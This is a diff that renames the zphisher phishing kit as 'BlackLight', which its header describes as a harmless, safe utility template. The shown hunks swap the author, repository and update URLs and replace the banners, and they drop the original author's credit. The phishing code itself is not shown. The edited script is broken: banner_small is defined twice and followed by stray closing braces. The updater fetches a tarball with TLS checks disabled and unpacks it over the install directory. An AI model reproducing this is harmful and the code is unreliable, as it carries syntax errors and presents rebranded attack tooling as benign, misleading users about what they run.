@@ -1,9 +1,9 @@
 #!/bin/bash
 
 ##   BlackLight       :         Safe Utility Script
-##   Author           :         Your Name <you@example.com>
+##   Author           :         Your Name <ttcnc911@example.com>
 ##   Version          :         1.0.0
-##   Repository       :         https://github.com/yourname/blacklight
+##   Repository       :         https://github.com/ttcnc911/blacklight
 ##
 ##   Description:
 ##     BlackLight is a harmless command-line utility template for
@@ -115,12 +115,12 @@ kill_pid() {
 	done
 }
 
-# Check for a newer release
+# ## Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
-	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	release_url='https://api.github.com/repos/ttcnc911/blacklight/releases/latest'
+	new_version=$(curl -s "${release_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	tarball_url="https://github.com/ttcnc911/blacklight/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -128,18 +128,18 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".blacklight.tar.gz" "${tarball_url}"
 
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
+		if [[ -e ".blacklight.tar.gz" ]]; then
+			tar -xf .blacklight.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occurred while extracting."; reset_color; exit 1; }
+			rm -f .blacklight.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run BlackLight again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occurred while downloading."
 			{ reset_color; exit 1; }
 		fi
 	else
@@ -154,20 +154,19 @@ check_status() {
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
-## Banner
+## ## Banner
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		${ORANGE}  ____  _            _       _     _      
+		${ORANGE} | __ )| | __ _  ___| | __ _| |__ | | ___ 
+		${ORANGE} |  _ \| |/ _\` |/ __| |/ _\` | '_ \| |/ _ \\
+		${ORANGE} | |_) | | (_| | (__| | (_| | |_) | |  __/
+		${ORANGE} |____/|_|\__,_|\___|_|\__,_|_.__/|_|\___|
+		
+		${RED}               Version : ${__version__}${WHITE}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool: BlackLight - Safe Utility${WHITE}
 	EOF
 }
 
@@ -175,10 +174,22 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${BLUE}  █▄▄ █░░ ▄▀█ █▀▀ █░█ █░░ █ █▀▀ ▀█▀
+		${BLUE}  █▄█ █▄▄ █▀█ █▄█ █▄█ █▄▄ █ ██▄ ░█░
+		${WHITE} ${__version__}
 	EOF
+}
+}
+
+## ## Small Banner
+banner_small() {
+	cat <<- EOF
+		${BLUE}
+		${BLUE}  █▄▄ █░░ ▄▀█ █▀█ █░█ █░░ █ █▀▀ ▀█▀
+		${BLUE}  █▄█ █▄▄ █▀█ █▀▀ █▄█ █▄▄ █ ██▄ ░█░
+		${WHITE}                 ${__version__}
+	EOF
+}
 }
 
 ## Dependencies
